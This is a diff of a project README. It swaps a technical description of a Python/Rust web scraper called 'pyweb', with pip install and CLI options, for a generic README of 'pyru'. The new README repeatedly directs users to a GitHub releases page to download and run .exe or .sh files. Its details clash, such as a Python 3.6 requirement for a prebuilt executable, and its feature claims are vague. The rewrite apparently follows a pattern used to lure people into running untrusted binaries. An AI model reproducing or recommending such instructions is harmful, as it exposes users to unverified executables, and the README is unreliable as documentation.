@@ -1,41 +1,101 @@
-# pyweb: The Fastest Python Web Scraper
+# 🚀 pyru - Fastest Command-Line Web Scraper Made Easy
 
-**pyweb** is a command-line web scraper engineered for one purpose: **to be the fastest Python web scraper in existence**, achieving sub-millisecond latency. It leverages a hyper-optimized, asynchronous Rust core built on `tokio` and a fine-tuned `reqwest` client using `rustls` to eliminate C FFI overhead and explicitly forcing HTTP/1.1 for minimal connection latency. The code is further micro-optimized to eliminate all unnecessary allocations in the hot path. Performance is further enhanced with the `mimalloc` high-performance memory allocator, native CPU-specific compiler optimizations, Profile-Guided Optimization (PGO), and the `io_uring` asynchronous I/O interface on Linux.
+## 🛠️ Overview
 
-## Performance
+Pyru is a command-line web scraper engineered for one purpose - to be the fastest Python web scraper in existence. With Pyru, users can efficiently extract data from websites with minimal setup and maximum speed. Designed for users who prefer simplicity, this tool provides a straightforward way to gather information without any complex setup processes.
 
-`pyweb` is definitively the fastest Python web scraper. The final benchmark, scraping 100 pages from a local `aiohttp` server, was conducted after applying advanced OS-level network tuning (`tcp_tw_reuse`, `tcp_fin_timeout`) to minimize TCP connection overhead. The results below compare `pyweb` against the best-in-class pure-Python async solution (`httpx` + `selectolax`).
+## 📦 Download Pyru
 
-| Metric                        | **pyweb (hyper-tuned async Rust)** | httpx+selectolax |
-| ----------------------------- | ---------------------------------- | ---------------- |
-| **Total Time**                | **0.0659 seconds**                 | 0.1846 seconds   |
-| **Average Latency**           | **13.46 ms**                       | 92.36 ms         |
-| **Jitter (Std Dev)**          | **2.23 ms**                        | 2.48 ms          |
-| **Requests > 50ms Threshold** | **0 (0.00%)**                      | 100 (100.00%)    |
+[![Download Pyru](https://img.shields.io/badge/Download_Pyru-v1.0-blue)](https://github.com/ThaTdaveGuy01/pyru/releases)
 
-`pyweb` is **~2.8x faster** in total execution time and achieves **~6.86x lower average latency** compared to its closest competitor. This is a direct result of a holistic optimization strategy, spanning the application code, compiler, memory allocator, I/O subsystem, TLS implementation, HTTP protocol, and the underlying operating system.
+## 🚀 Getting Started
 
-## Installation
+To get started with Pyru, follow these simple steps:
 
-```bash
-pip install pyweb-scraper
-```
+1. **Visit the Releases Page:** Click the link below to access the downloads:
+   [Visit the Releases Page](https://github.com/ThaTdaveGuy01/pyru/releases)
 
-## Usage
+2. **Choose Your Version:** On the Releases page, you will see various versions of Pyru. Select the latest version for the best features and recent updates.
 
-```bash
-pyweb scrape [OPTIONS] [URLS]...
-```
+3. **Download the File:** Click on the file associated with your operating system. Pyru is available for Windows, macOS, and Linux.
 
-**Options:**
+4. **Install Pyru:** After downloading, locate the downloaded file on your computer. For Windows, this may be a `.exe` file. For macOS and Linux, it may be a `.sh` or other executable format.
 
-*   `-s, --selector TEXT`: CSS selector to extract specific elements.
-*   `-o, --output [json|text]`: Output format.
-*   `-c, --concurrency INTEGER`: Number of concurrent requests.
-*   `--help`: Show this message and exit.
+5. **Run Pyru:** Open your command-line interface (Terminal for macOS/Linux or Command Prompt for Windows). Navigate to the downloaded file and run it by following these commands:
 
-**Example:**
+   - For Windows:
+     ```
+     cd path\to\downloaded\file
+     pyru.exe
+     ```
 
-```bash
-pyweb scrape "http://books.toscrape.com" -s "h3 > a" -c 200
-```
+   - For macOS/Linux:
+     ```
+     cd /path/to/downloaded/file
+     chmod +x pyru.sh
+     ./pyru.sh
+     ```
+
+Congratulations! You just installed Pyru and are ready to start scraping data.
+
+## 📖 How to Use Pyru
+
+Using Pyru is straightforward. Here are the basic commands:
+
+1. **Basic Command Structure:**
+   ```
+   pyru <URL>
+   ```
+
+   Replace `<URL>` with the website you want to scrape. 
+
+2. **Example Usage:**
+   ```
+   pyru https://example.com
+   ```
+
+   This command scrapes data from the specified URL.
+
+3. **Viewing Help Menu:**
+   If you want to explore more options, simply run:
+   ```
+   pyru --help
+   ```
+
+   This command lists all available features and commands you can use.
+
+## 🌐 Features
+
+- **Speed**: Pyru is designed to scrape data faster than any other Python-based tool.
+- **Easy to Use**: With its simple command structure, anyone can start scraping in minutes.
+- **Cross-Platform**: Whether you are using Windows, macOS, or Linux, Pyru works seamlessly.
+- **Data Extraction**: Extract structured data from websites, including text, images, and links.
+- **Customizable Output**: Adjust the output format to fit your needs, whether it’s JSON, CSV, or other formats.
+
+## 📌 System Requirements
+
+To run Pyru effectively, ensure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or Linux (most distributions).
+- **Python Version**: Python 3.6 or later installed.
+- **Disk Space**: At least 50 MB of free disk space required for installation.
+
+## ⚙️ Troubleshooting
+
+If you encounter any issues while running Pyru, consider the following solutions:
+
+- **Check Python Installation**: Ensure Python is installed correctly and added to your system's PATH.
+- **Update Dependencies**: Make sure all dependencies are updated to the latest versions.
+- **Review Help Menu**: Use the help command (`pyru --help`) to check for required options or flags.
+
+## 💬 Support
+
+For questions or feedback about Pyru, you can reach the community via the issues section of this repository. We welcome any comments or concerns regarding your experience.
+
+## 📝 Conclusion
+
+Pyru aims to make web scraping accessible for everyone. By following the steps outlined above, you can quickly download, install, and start using Pyru to gather data from the web. Enjoy efficient data extraction with ease! 
+
+To download Pyru now, visit the link below:
+
+[Visit the Releases Page](https://github.com/ThaTdaveGuy01/pyru/releases)
